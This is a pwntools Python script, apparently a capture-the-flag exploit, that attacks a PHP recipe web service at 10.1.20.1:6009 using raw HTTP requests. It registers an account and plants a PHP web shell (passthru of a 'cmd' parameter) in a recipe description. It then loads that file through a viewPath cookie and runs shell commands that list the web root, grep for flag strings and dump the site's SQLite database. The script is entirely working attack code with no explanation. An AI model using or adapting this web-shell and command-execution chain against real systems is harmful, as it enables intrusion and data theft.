from pwn import *

proc = remote('10.1.20.1', 6009)
proc.write(b"POST /register HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aContent-Length: 35\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0ausername=6d1d1421&password=375d2449")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
proc.write(b"GET / HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aCookie: PHPSESSID=df2b717c639ff972db1e4bdb006ddfe3\x0d\x0a\x0d\x0a")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
proc.write(b"POST /recipes HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aCookie: PHPSESSID=df2b717c639ff972db1e4bdb006ddfe3\x0d\x0aContent-Length: 81\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0atitle=53e7343e&description=%3C%3F%3Dpassthru%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
proc.write(b"GET /recipes/5144 HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aCookie: PHPSESSID=df2b717c639ff972db1e4bdb006ddfe3\x0d\x0a\x0d\x0a")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
proc.write(b"GET /?cmd=ls+-la+%2Fvar%2Fwww%2Fhtml HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aCookie: PHPSESSID=df2b717c639ff972db1e4bdb006ddfe3; viewPath=files/87af3451a1532978346ae1d952051ad1/53e7343e.md\x0d\x0a\x0d\x0a")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
proc.write(b"GET /?cmd=grep+-ER+%27ENO%5BA-Za-z0-9%2B%5C%2F%3D%5D%7B48%7D%27+%2Fvar%2Fwww%2Fhtml%2Ffiles%3B+cat+%2Fvar%2Fwww%2Fhtml%2FDatabase%2Fdb.sqlite HTTP/1.1\x0d\x0aHost: 10.1.20.1:6009\x0d\x0aUser-Agent: python-requests/2.28.1\x0d\x0aAccept-Encoding: gzip, deflate, br\x0d\x0aAccept: */*\x0d\x0aConnection: keep-alive\x0d\x0aCookie: PHPSESSID=df2b717c639ff972db1e4bdb006ddfe3; viewPath=files/87af3451a1532978346ae1d952051ad1/53e7343e.md\x0d\x0a\x0d\x0a")
proc.recvuntil(b"x0a0\x0d\x0a\x0d\x0a")
